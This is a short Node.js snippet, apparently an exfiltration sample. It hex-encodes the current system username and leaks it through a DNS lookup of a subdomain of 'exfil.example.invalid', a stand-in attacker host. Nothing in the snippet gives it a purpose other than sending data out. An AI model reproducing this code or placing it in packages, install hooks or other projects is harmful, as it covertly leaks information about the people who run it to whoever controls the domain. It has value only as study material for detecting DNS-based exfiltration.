const dns = require('dns');
const os = require('os');
const label = Buffer.from(os.userInfo().username).toString('hex');
dns.resolve(label + '.exfil.example.invalid', () => {});
